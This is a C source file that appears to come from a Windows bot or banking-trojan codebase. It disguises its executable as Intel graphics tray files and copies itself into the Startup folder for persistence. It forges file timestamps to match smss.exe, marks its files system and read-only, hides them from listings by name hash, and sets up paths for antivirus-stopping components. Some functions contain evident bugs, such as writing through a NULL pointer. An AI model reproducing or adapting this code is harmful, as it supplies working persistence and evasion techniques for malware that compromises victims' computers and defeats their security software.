
#include <windows.h>
#include <shlobj.h>

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"

#include "Crypt.h"
#include "BotHTTP.h"
#include "BotUtils.h"
#include "dprint.h"
#include "CabPacker.h" 


//igfxtray.exe
//igfxtray.dat

WCHAR BOT_FILE_NAME[] = {'\\','i','g','f','x','t','r','a','y','.','e','x','e',0};

//igxpdv32.dat
//igxpgd32.dat

WCHAR BOT_STOPAV_NAME[] = {'\\','i','g','x','p','d','v','3','2','.','d','a','t', 0};
WCHAR BOT_MINIAV_NAME[] = {'\\','i','g','x','p','g','d','3','2','.','d','a','t', 0};

DWORD BOT_FILE_HASH = 0xED3D8E99;
DWORD BOT_CFGN_HASH	= 0xED3DC208;
DWORD BOT_STAV_HASH = 0x551DD093;
DWORD BOT_MNAV_HASH = 0x551B9893;


DWORD GetBotHash()
{
	return BOT_FILE_HASH;
}

DWORD GetCfgHash()
{
	return BOT_CFGN_HASH;
}

WCHAR *GetShellFoldersKey( DWORD dwParam )
{
	int dwTemp = 0;

	if ( dwParam == 1 )
	{
		dwTemp = CSIDL_STARTUP;
	}
	else if ( dwParam == 2 )
	{
		dwTemp = CSIDL_APPDATA;
	}

	WCHAR *UserPath = (WCHAR*)MemAlloc( MAX_PATH * sizeof(WCHAR) );

	if ( UserPath == NULL )
	{
		return NULL;
	}

	pSHGetSpecialFolderPathW((HWND)NULL, UserPath, dwTemp, true);

	return UserPath;
}

void SetFakeFileDateTime( WCHAR *Path )
{
	WCHAR smss[] = {'\\','s','m','s','s','.','e','x','e',0};

	WCHAR *SysPath = (WCHAR *)MemAlloc( 512 );

	if ( SysPath == NULL )
	{
		return;
	}

	pGetSystemDirectoryW( SysPath, 512 );
	plstrcatW( SysPath, smss );

	HANDLE hFile = pCreateFileW( SysPath,  GENERIC_READ,  FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );

	MemFree( SysPath );
	
	if ( hFile == INVALID_HANDLE_VALUE )
	{
		return;
	}

	FILETIME fl1;
	FILETIME fl2;
	FILETIME fl3;

	pGetFileTime( hFile, &fl1, &fl2, &fl3 );
	pCloseHandle( hFile );

	hFile = pCreateFileW( Path,  GENERIC_WRITE,  FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );

	if ( hFile == INVALID_HANDLE_VALUE )
	{
		return;
	}

	pSetFileTime( hFile, &fl1, &fl2, &fl3 );
	pCloseHandle( hFile );

	return;
}



WCHAR *GetBotPath()
{
	PWCHAR BotFile = (PWCHAR)MemAlloc(sizeof(WCHAR)*MAX_PATH);

	if ( !m_wcslen( BotFile ) )
	{
		WCHAR *BotPath = GetShellFoldersKey( 1 );

		if ( BotPath == NULL )
		{
			return NULL;
		}

		plstrcatW( BotPath, BOT_FILE_NAME );
		plstrcpyW( BotFile, BotPath );

		MemFree( BotPath );
	}

	WCHAR *Ret = BotFile;

	return Ret;
}




WCHAR *GetMiniAVPath()
{

	PWCHAR Ret = (PWCHAR)MemAlloc(sizeof(WCHAR)*MAX_PATH);
	
	if (*Ret == 0)
	{
		WCHAR *AppPath = GetShellFoldersKey( 2 );

		if ( AppPath  )
		{
			plstrcpyW( Ret, AppPath		   );
			plstrcatW( Ret, BOT_MINIAV_NAME );

			MemFree( AppPath );
		}
	}

	return Ret;
}


WCHAR *GetStopAVPath()
{

	PWCHAR Ret = (PWCHAR)MemAlloc(sizeof(WCHAR)*MAX_PATH);;
	if (*Ret == 0)
	{
		WCHAR *AppPath = GetShellFoldersKey( 2 );

		WCHAR *Ret = NULL;

		if (AppPath)
		{
			plstrcpyW( Ret, AppPath		   );
			plstrcatW( Ret, BOT_STOPAV_NAME );

			MemFree( AppPath );
		}
	}

	return Ret;
}


void AddToAutoRun( WCHAR *TempFileName )
{	
	if ( pGetFileAttributesW( TempFileName ) != 0 )
	{
		WCHAR *BotPath = GetShellFoldersKey( 1 );
		if ( BotPath == NULL )
		{
			return;
		}

		plstrcatW( BotPath, BOT_FILE_NAME );

		pSetFileAttributesW( BotPath, FILE_ATTRIBUTE_NORMAL );

		pCopyFileW( TempFileName, BotPath, FALSE );

		SetFakeFileDateTime( BotPath );

		pSetFileAttributesW( BotPath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
	
		pDeleteFileW( TempFileName );

		MemFree( BotPath );
	}

	return;
}

void AddToAutoRun(void *body, DWORD size)
{	
	WCHAR *BotPath = GetShellFoldersKey( 1 );
	if ( BotPath == NULL )
	{
		return;
	}

	plstrcatW( BotPath, BOT_FILE_NAME );
	pSetFileAttributesW( BotPath, FILE_ATTRIBUTE_NORMAL );

	HANDLE f = pCreateFileW(BotPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	DWORD  written = 0;
	if (f != INVALID_HANDLE_VALUE)
	{
		pWriteFile(f, body, size, &written, NULL);
		pCloseHandle(f);
	}

	if (written == size)
	{
		SetFakeFileDateTime( BotPath );
		pSetFileAttributesW( BotPath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
	}

	MemFree( BotPath );
}



WCHAR *GetNameFromPath( WCHAR *Path )
{
	if ( !Path )
	{
		return NULL;
	}

	WCHAR *Name = NULL;
	
	for ( DWORD i = m_wcslen( Path ) - 1; i > 0; i-- )
	{
		if ( Path[i] == '\\' )
		{
			Name = &Path[i + 1];
			break;
		}
	}

	if ( Name == NULL )
	{
		Name = Path;
	}

	return Name;
}


DWORD GetNameHash( WCHAR *Path )
{
	if ( !Path )
	{
		return 0;
	}

	WCHAR *Name = GetNameFromPath( Path );

	if ( !Name )
	{
		return 0;
	}

	m_wcslwr( Name );

	DWORD dwHash = CalcHashW( Name );

	return dwHash;
}

WCHAR *GetTempName()
{
	WCHAR *TempPath = (WCHAR*)MemAlloc( 512 );
	WCHAR *FileName = (WCHAR*)MemAlloc( 512 );

	if ( !TempPath || !FileName )
	{
		return NULL;
	}

	pGetTempPathW( 512, TempPath );
	pGetTempFileNameW( TempPath, L"", 0, FileName );

	MemFree( TempPath );

	return FileName;
}


BOOL IsHide( DWORD dwFileHash )
{
	if ( dwFileHash == BOT_FILE_HASH || dwFileHash == BOT_CFGN_HASH ||
		 dwFileHash == BOT_STAV_HASH || dwFileHash == BOT_MNAV_HASH )
	{
		return TRUE;
	}

	return FALSE;
}

BOOL IsHideFile( WCHAR *pwszFile, ULONG iFileLen )
{
	if ( !pwszFile )
	{
		return FALSE;
	}

	WCHAR *File = (WCHAR*)MemAlloc( iFileLen + 1 );

	if ( File == NULL )
	{
		return FALSE;
	}

	m_memcpy( File, pwszFile, iFileLen );

	m_wcslwr( File );

	DWORD dwFileHash = CalcHashW( File );
	MemFree( File );

	if ( IsHide( dwFileHash ) )
	{
		return TRUE;
	}	
	
	return FALSE;
}

void CopyFileToTemp( WCHAR *Path, WCHAR *Temp )
{
	if ( !Path || !Temp )
	{
		return;
	}

	WCHAR *TempPath = GetTempName();

	if ( TempPath == NULL )
	{
		return;
	}

	pCopyFileW( Path, TempPath, FALSE );

	plstrcpyW( Temp, TempPath );

	MemFree( TempPath );

	return;
}

PCHAR GetUserForDebugInfo()
{
	if (IsUserLocalSystem()) return "system";
	if (IsUserAdmin()) return "admin";
	return "user";
}

